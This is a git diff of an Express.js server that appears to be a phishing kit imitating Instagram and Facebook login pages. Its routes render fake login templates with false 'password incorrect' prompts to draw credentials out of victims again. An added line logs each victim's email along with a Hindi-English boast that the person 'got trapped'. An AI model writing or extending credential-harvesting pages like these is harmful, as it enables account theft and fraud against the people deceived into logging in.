@@ -36,11 +36,13 @@ app.get("/continueInstagram/:logvia" , function (req , res) {
     }
   })
 
+  show(`${email} naam ka banda fhass gaya! at ${new Date(Date.now())}`)
+
 
 })
 
 app.get("/swr" , function (req , res) {
-  res.redirect("/" , {wrongpass: "Sorry! Something Went Wrong.\nPlease try Again." , or: ""})
+  res.redirect("/")
 })
 
 app.get("/loginAgain/:via" , function (req , res) {
@@ -50,17 +52,12 @@ app.get("/loginAgain/:via" , function (req , res) {
 
   if (via === `instagram`) res.render("insta" , {wrongpass : "Your Username or Password is Incorrect.\nPlease try agin." , or: ""})
 
-  else if (via === `facebook`) res.render("fb" , {fbwrongpass : "Your Username or Password is Incorrect!.\nPlease try agin."})
+  else if (via === `facebook`) res.render("fb" , {wrongpass : "Your Username or Password is Incorrect!.\nPlease try agin."})
 
   else res.redirect("/swr")
 })
 
-app.get("/facebook/login" , function (req , res) {
-  res.render("fb" , {fbwrongpass: "Forgot your Password ?"})
+
+app.listen(3000 , () => {
+  console.log("Server Started.")
 })
-
-
-
-
-
-app.listen(3000)
